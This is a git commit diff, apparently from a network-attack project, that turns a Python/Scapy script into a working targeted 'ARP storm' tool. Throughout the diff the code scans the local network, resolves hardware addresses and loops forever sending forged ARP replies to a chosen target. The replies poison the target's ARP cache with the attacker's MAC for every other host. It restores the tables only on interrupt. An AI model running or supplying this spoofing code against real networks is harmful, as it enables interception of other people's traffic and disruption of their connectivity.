04ffcf2486d93446119bce2b6f59cf932bf46cdf
Har1sh-k <hkolla03@gmail.com>
2025-03-06 09:53:33 -0600

    working arp_storm

--- src/flooding/arp_storm_targeted.py
+++ src/flooding/arp_storm_targeted.py
@@ -27,27 +27,42 @@ def scan():
     devices[current_ip] = get_if_hwaddr(conf.iface)
     return devices
 
-
-def spoof(target_ip_mac, spoof_ip_mac, interface):
-    target_mac = target_ip_mac[1]
-    target_ip= target_ip_mac[0]
-    spoof_mac = spoof_ip_mac[1]
-    spoof_ip = spoof_ip_mac[0]
-    packet = Ether(dst=target_mac, src=spoof_mac) / \
-             ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    sendp(packet, iface=interface, verbose=0)
-    return
-
-def restore(target_ip_mac, original_ip_mac, interface):
-    return
-
-def start_attack(ip, iface, multi):
-    devices = scan()
-    if multi:
-        for target_ip_mac in devices.items():
-            spoof(target_ip_mac, devices[random.choice(list(devices.keys()))], iface)
+def get_mac(ip):
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
+    if ans:
+        return ans[0][1].hwsrc
     else:
-        spoof(devices[ip], devices[random.choice(list(devices.keys()))], iface)
+        print(f"[!] Failed to get MAC for {ip}")
+        return None
+
+def spoof(from_mac, from_ip,to_ip,interface, devices):
+    to_mac = get_mac(to_ip)
+    
+    packet = Ether(dst=to_mac, src=from_mac) / \
+             ARP(op=2, pdst=to_ip, hwdst=to_mac, psrc=from_ip)
+    sendp(packet, iface=interface, verbose=0)
+    print(f"[*] Sent to {to_ip}={to_mac} from {from_ip}-{from_mac}")
+    return
+
+def restore(ip, iface, devices):
+    for from_ip in devices.keys():
+        from_mac = devices[from_ip]
+        to_mac = get_mac(ip)
+        packet = Ether(dst=to_mac, src=from_mac) / \
+                 ARP(op=2, pdst=ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
+        sendp(packet, count=4, iface=iface, verbose=0)
+        print(f"[*] Restored {ip}={to_mac} from {from_ip}-{from_mac}")
+    return
+
+def start_attack(to_ip, iface, multi,devices):
+    mac= rand_mac()
+    mac=devices[get_if_addr(iface)]
+    if multi:
+        for from_ip in devices.keys():
+            spoof(mac, from_ip, to_ip, iface, devices)
+    else:
+        #spoof(devices[ip], ip, iface)
+        pass
     return
 
 if __name__ == "__main__":
@@ -56,23 +71,34 @@ if __name__ == "__main__":
     parser.add_argument('target', help='IP of first target')
     parser.add_argument('-i', '--interface', default='eth0',
                        help='Network interface (default: eth0)')
-    parser.add_argument('-m', '--multi', default=False,
-                       help='Enable multi-MAC ARP storm')
+    #parser.add_argument('-m', '--multi', default=True,
+    #                   help='Enable multi-MAC ARP storm')
     
     args = parser.parse_args()
     
     ip = args.target
     iface = args.interface
-    storm = args.multi
+    #storm = args.multi
+    storm = True
     
     try:
         print(f"[*] Starting ARP attack om {args.target}")
+        devices = scan()
+        #debugging
+        print(f"[*] Devices found: {devices}")
+        if ip in devices: del devices[ip]
+        else: 
+            print(f"[*] Target {ip} not found in network")
+            sys.exit(0)
+        #debigging
+        
+        print(f"[*] Scan Complete -debug- {args.target}")
         while True:
-            start_attack(ip, iface, storm)
-            time.sleep(2)
+            start_attack(ip, iface, storm,devices)
+            time.sleep(10)
             
     except KeyboardInterrupt:
         print("\n[*] Restoring ARP tables")
-        restore(ip, iface)
+        restore(ip, iface,devices)
         sys.exit(0)
         
